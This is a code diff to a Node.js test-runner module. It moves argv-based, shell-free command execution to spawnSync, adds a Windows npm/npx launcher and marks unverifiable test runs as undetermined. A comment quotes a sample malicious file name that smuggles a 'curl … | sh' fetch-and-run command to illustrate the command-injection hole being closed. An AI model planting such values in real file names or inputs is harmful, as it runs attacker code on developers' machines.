@@ -33,8 +33,9 @@
  * wolf gets disabled.
  */
 
-const { execSync, execFileSync } = require('child_process');
+const { execSync, execFileSync, spawnSync } = require('child_process');
 const path = require('path');
+const safeFs = require('./safe-fs');
 
 const qualityState = require('./quality-state');
 const toolDetector = require('./tool-detector');
@@ -134,7 +135,7 @@ function runCommand(cmd, options = {}) {
  * Run a command via an ARGV VECTOR (no shell) and capture output.
  *
  * The injection-safe sibling of {@link runCommand}: the binary and each argument are
- * passed as SEPARATE elements to execFileSync with `shell:false`, so NO shell (/bin/sh
+ * passed as SEPARATE elements to spawnSync with `shell:false`, so NO shell (/bin/sh
  * -c) ever interprets an operand. This is the ONLY path used for runSpecificTests'
  * per-framework invocations, whose test-file/package operands originate from
  * `.ctoc/state/coverage-map.json` (arbitrary, unsanitized strings) or a filename
@@ -142,40 +143,92 @@ function runCommand(cmd, options = {}) {
  * path like `a$(curl -s evil|sh).test.js` was a shell command substitution and ran
  * arbitrary code on every `/ctoc:push`; here it is one literal argv element, inert.
  *
- * Contract mirrors runCommand EXACTLY — same {silent, allowFail, timeout} options and
- * the same {success, output, error?, timedOut?} return shape — so the allowFail
- * capture (read err.stdout/err.status without throwing), the silent flag, and the
- * pass-count parsing all behave identically to the shell path.
+ * spawnSync, not execFileSync (the hotfix check's Decision 34): execFileSync returns only
+ * standard output when the program succeeds, so a runner that prints its counters on
+ * standard error (jest does, on a pass) was never read. `output` is the run's standard
+ * output followed by its standard error (each trimmed, the non-empty ones joined by a line
+ * feed), on a passing and a failing run alike.
+ *
+ * A run that did not succeed carries, read in this order: `outputTooLarge` when its output
+ * passed the 10 MiB buffer (ENOBUFS; spawnSync then also reports SIGTERM, which is why this
+ * is read first and such a run is never called timed out); else `timedOut` (SIGTERM or
+ * ETIMEDOUT); and `notStarted` when the program could not be started (ENOENT, EACCES,
+ * EINVAL) or a command shell reported it missing (127 on macOS and Linux, 9009 from
+ * Windows' command interpreter). Without `allowFail` it throws an Error carrying `status`,
+ * `signal`, `stdout`, `stderr` and `code`, the shape execFileSync threw, so callers that
+ * rely on the throw are unchanged.
  *
  * @param {string} bin - the executable (an argv[0], never a shell string)
  * @param {string[]} args - argument vector; each element is passed literally
  * @param {{silent?: boolean, allowFail?: boolean, timeout?: number}} [options]
- * @returns {{success: boolean, output: string, error?: string, timedOut?: boolean}}
+ * @returns {{success: boolean, output: string, error?: string, timedOut?: boolean, outputTooLarge?: boolean, notStarted?: boolean}}
  */
 function runCommandArgv(bin, args, options = {}) {
   const { silent = false, allowFail = false, timeout = 300000 } = options;
+  const r = spawnSync(bin, args, {
+    encoding: 'utf8',
+    stdio: silent ? 'pipe' : 'inherit',
+    shell: false, // the whole point: no shell parses the operands
+    maxBuffer: 10 * 1024 * 1024, // 10MB
+    timeout,
+    windowsHide: true
+  });
+  const text = (v) => (typeof v === 'string' ? v.trim() : '');
+  const output = [text(r.stdout), text(r.stderr)].filter(Boolean).join('\n');
+  if (!r.error && r.status === 0) return { success: true, output };
 
-  try {
-    const output = execFileSync(bin, args, {
-      encoding: 'utf8',
-      stdio: silent ? 'pipe' : 'inherit',
-      shell: false, // the whole point: no shell parses the operands
-      maxBuffer: 10 * 1024 * 1024, // 10MB
-      timeout
-    });
-    return { success: true, output: output?.trim() || '' };
-  } catch (err) {
-    // A test framework exits non-zero on failing tests but still prints its report to
-    // stdout (carried on err.stdout) — the allowFail path reads it, exactly like
-    // runCommand. A timeout is surfaced LOUDLY, never swallowed.
-    const timedOut = Boolean(err.killed) || err.signal === 'SIGTERM' || err.code === 'ETIMEDOUT';
-    if (allowFail) {
-      const result = { success: false, output: err.stdout || '', error: err.message };
-      if (timedOut) result.timedOut = true;
-      return result;
-    }
-    throw err;
+  const code = r.error ? /** @type {NodeJS.ErrnoException} */ (r.error).code : undefined;
+  const error = r.error ? r.error.message
+    : `Command failed: ${bin} exited with ${r.status !== null ? r.status : r.signal}`;
+  /** @type {{success: boolean, output: string, error: string, timedOut?: boolean, outputTooLarge?: boolean, notStarted?: boolean}} */
+  const result = { success: false, output, error };
+  if (code === 'ENOBUFS') result.outputTooLarge = true;
+  else if (r.signal === 'SIGTERM' || code === 'ETIMEDOUT') result.timedOut = true;
+  const shellMissing = process.platform === 'win32' ? 9009 : 127;
+  if (code === 'ENOENT' || code === 'EACCES' || code === 'EINVAL' || (!r.error && r.status === shellMissing)) {
+    result.notStarted = true;
   }
+  if (allowFail) return result;
+  throw Object.assign(new Error(error), { status: r.status, signal: r.signal, stdout: r.stdout, stderr: r.stderr, code });
+}
+
+/** The exact test script `npm init` writes: it runs no test and always fails. */
+const NPM_PLACEHOLDER_TEST = 'echo "Error: no test specified" && exit 1';
+const NPM_PLACEHOLDER_ERROR = 'the package.json test script is npm\'s placeholder ("no test specified"), so no test ran';
+const NO_NPM_SCRIPT_ERROR = 'npm\'s command-line script was not found beside node';
+
+/**
+ * How npm or npx is started (the hotfix check's Decision 35). Read at each call, so a
+ * test can replace `process.platform` and `process.execPath`. On Windows Node refuses to
+ * start a `.cmd` file without a shell, and a command interpreter started by CTOC is safe
+ * only for a fixed literal, so npm and npx start as node itself running npm's own
+ * command-line script beside it (what npm.cmd and npx.cmd do); no command interpreter is
+ * started by CTOC. Elsewhere npm and npx are started by name.
+ * @param {'npm'|'npx'} tool
+ * @returns {{bin: string, lead: string[]}|{missing: string}} the program and its leading
+ *   arguments, or the path of the script that does not exist
+ */
+function npmLauncher(tool) {
+  if (process.platform !== 'win32') return { bin: tool, lead: [] };
+  const script = path.join(path.dirname(process.execPath), 'node_modules', 'npm', 'bin', `${tool}-cli.js`);
+  if (!safeFs.existsSync(script)) return { missing: script };
+  return { bin: process.execPath, lead: [script] };
+}
+
+/**
+ * Start npm or npx with `args` through {@link npmLauncher}. A missing script starts
+ * nothing and answers a run that did not start.
+ * @param {'npm'|'npx'} tool
+ * @param {string[]} args
+ * @param {{silent?: boolean, allowFail?: boolean, timeout?: number}} options
+ * @returns {{success: boolean, output: string, error?: string, timedOut?: boolean, outputTooLarge?: boolean, notStarted?: boolean}}
+ */
+function runNpmTool(tool, args, options) {
+  const launch = npmLauncher(tool);
+  if ('missing' in launch) {
+    return { success: false, notStarted: true, output: '', error: `${NO_NPM_SCRIPT_ERROR} (${launch.missing})` };
+  }
+  return runCommandArgv(launch.bin, [...launch.lead, ...args], options);
 }
 
 // A configured command carrying any of these OUTSIDE a quote is shell STRUCTURE this
@@ -278,7 +331,7 @@ function parseConfiguredCommand(cmd) {
  *
  * @param {string} cmd
  * @param {{silent?: boolean, allowFail?: boolean, timeout?: number, label?: string}} [options]
- * @returns {{success: boolean, output: string, error?: string, timedOut?: boolean, refused?: boolean}}
+ * @returns {{success: boolean, output: string, error?: string, timedOut?: boolean, outputTooLarge?: boolean, notStarted?: boolean, refused?: boolean}}
  */
 function runConfiguredCommand(cmd, options = {}) {
   const parsed = parseConfiguredCommand(cmd);
@@ -305,7 +358,7 @@ function runConfiguredCommand(cmd, options = {}) {
  * pattern — `"test": "jest && tsc"`, `"test": "npm run lint && npm run test:unit"` — carries
  * `&&`, which {@link parseConfiguredCommand} correctly refuses for the `.ctoc` attack
  * surface but which must NOT block a normal project's own push. So a script-derived command
- * is launched through npm as a 2-token argv (`npm test`, execFileSync shell:false): npm
+ * is launched through npm as a 2-token argv (`npm test`, spawnSync shell:false): npm
  * executes the project-owned compound INTERNALLY and NO shell ever reaches this module.
  *
  * Any OTHER configured test command (from `.ctoc/quality-config.yaml` or a capability file —
@@ -313,17 +366,22 @@ function runConfiguredCommand(cmd, options = {}) {
  * {@link runConfiguredCommand}: shell structure is REFUSED, never launched. This preserves
  * the injection defense the 00203 slice added.
  *
- * Cross-platform: the launcher is `npm.cmd` on Windows and `npm` elsewhere, mirroring the
- * shipped `npx.cmd` handling in runSpecificTests and sca-runner's `npm.cmd`.
+ * Cross-platform: npm starts through {@link npmLauncher} — node running npm's own
+ * npm-cli.js on Windows, `npm` by name elsewhere; no command interpreter either way. npm's
+ * placeholder test script (`echo "Error: no test specified" && exit 1`) runs nothing and
+ * answers a run that did not start (`notStarted`).
  *
  * @param {{test: string, testFromScript?: boolean}} langTools the detected tools for a language
  * @param {{silent?: boolean, allowFail?: boolean, timeout?: number, label?: string}} [options]
- * @returns {{success: boolean, output: string, error?: string, timedOut?: boolean, refused?: boolean}}
+ * @returns {{success: boolean, output: string, error?: string, timedOut?: boolean, outputTooLarge?: boolean, notStarted?: boolean, refused?: boolean}}
  */
 function runProjectTestCommand(langTools, options = {}) {
   if (langTools.testFromScript) {
-    const npm = process.platform === 'win32' ? 'npm.cmd' : 'npm';
-    return runCommandArgv(npm, ['test'], options);
+    // npm's placeholder runs no test: nothing is started, and the run did not start.
+    if (String(langTools.test).trim() === NPM_PLACEHOLDER_TEST) {
+      return { success: false, notStarted: true, output: '', error: NPM_PLACEHOLDER_ERROR };
+    }
+    return runNpmTool('npm', ['test'], options);
   }
   return runConfiguredCommand(langTools.test, options);
 }
@@ -387,6 +445,33 @@ function undeterminedTestsResult(langs) {
 const ANSI_PATTERN =
   /\x1b\[[0-9;:<=>?]*[ -/]*[@-~]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)|\x1b[@-Z\\-_]/g;
 //  ^ CSI (SGR colour `ESC[31m`, cursor moves)  ^ OSC (hyperlinks/titles)  ^ 2-char escapes
+
+/**
+ * The NON-pass result for a run that cannot certify anything: its output passed 10 MiB,
+ * it timed out, or it never started (a runner that cannot be started, npm's placeholder
+ * test script, npm's script missing beside node). Reuses this module's `undetermined`
+ * state, so `/ctoc:push` still blocks on `!passed` and the hotfix check reads "no test
+ * ran"; it is never a failure of the project's tests. Each cause has its own line.
+ * @param {string} lang
+ * @param {{outputTooLarge?: boolean, timedOut?: boolean, notStarted?: boolean, error?: string}} result
+ * @param {number} passCount - passing tests counted so far
+ * @param {number} skipped - skipped tests counted so far
+ * @returns {{passed:false, undetermined:true, passCount:number, failed:number, skipped:number, flaky:number, output:string}}
+ */
+function undeterminedRunResult(lang, result, passCount, skipped) {
+  const error = result.error || '';
+  let why;
+  if (result.outputTooLarge) why = 'the test run printed more than 10 MiB of output, so its counters cannot be trusted';
+  else if (result.timedOut) why = 'the test run timed out';
+  else if (error === NPM_PLACEHOLDER_ERROR || error.startsWith(NO_NPM_SCRIPT_ERROR)) why = error;
+  else why = `the test runner could not be started (${error})`;
+  const msg = `tests undetermined — NOT verified for ${lang}: ${why}.`;
+  console.log(`   ${msg}`);
+  return { passed: false, undetermined: true, passCount, failed: 0, skipped, flaky: 0, output: msg };
+}
+
+/** @param {{outputTooLarge?: boolean, timedOut?: boolean, notStarted?: boolean}} result */
+const cannotCertify = (result) => Boolean(result.outputTooLarge || result.timedOut || result.notStarted);
 
 /**
  * Remove ANSI escape sequences so the line-anchored parsers below see the real first
@@ -717,18 +802,17 @@ function runSpecificTests(tools, testFiles) {
     // COMMAND-INJECTION FIX: testFiles come from .ctoc/state/coverage-map.json
     // (entry.tests — arbitrary, unsanitized strings) or a filename heuristic. They
     // MUST NEVER be interpolated into a shell command string. Every per-framework
-    // invocation runs on the argv-safe path (runCommandArgv → execFileSync,
+    // invocation runs on the argv-safe path (runCommandArgv → spawnSync,
     // shell:false), so a path like `a$(...).test.js` is one literal argv element, not
     // a shell substitution. This mirrors the established pattern in sca-runner.js /
-    // sast-runner.js / secrets-scanner.js. On Windows the npx launcher is a `.cmd`
-    // shim, mirroring sca-runner's `npm.cmd` handling.
-    const npx = process.platform === 'win32' ? 'npx.cmd' : 'npx';
-
+    // sast-runner.js / secrets-scanner.js.
+    // npx starts through npmLauncher: node running npm's own npx-cli.js on Windows (Node
+    // refuses to start npx.cmd without a shell), `npx` by name elsewhere.
     let result;
     if (langTools.testFramework === 'jest') {
-      result = runCommandArgv(npx, ['jest', ...testFiles], { allowFail: true, silent: true });
+      result = runNpmTool('npx', ['jest', ...testFiles], { allowFail: true, silent: true });
     } else if (langTools.testFramework === 'vitest') {
-      result = runCommandArgv(npx, ['vitest', 'run', ...testFiles], { allowFail: true, silent: true });
+      result = runNpmTool('npx', ['vitest', 'run', ...testFiles], { allowFail: true, silent: true });
     } else if (langTools.testFramework === 'pytest') {
       result = runCommandArgv('pytest', [...testFiles], { allowFail: true, silent: true });
     } else if (langTools.testFramework === 'go') {
@@ -750,6 +834,7 @@ function runSpecificTests(tools, testFiles) {
       result = runProjectTestCommand(langTools, { allowFail: true, silent: true, label: `${lang} test` });
     }
 
+    if (!result.success && cannotCertify(result)) return undeterminedRunResult(lang, result, totalPassed, totalSkipped);
     if (!result.success) {
       return {
         passed: false,
@@ -815,6 +900,7 @@ async function runFullTests(tools) {
     // a FAILED check, never handed to a shell (00203 F1 repair — see runProjectTestCommand).
     const result = runProjectTestCommand(langTools, { allowFail: true, silent: true, label: `${lang} test` });
 
+    if (!result.success && cannotCertify(result)) return undeterminedRunResult(lang, result, totalPassed, totalSkipped);
     if (!result.success) {
       const output = result.output || result.error || '';
 
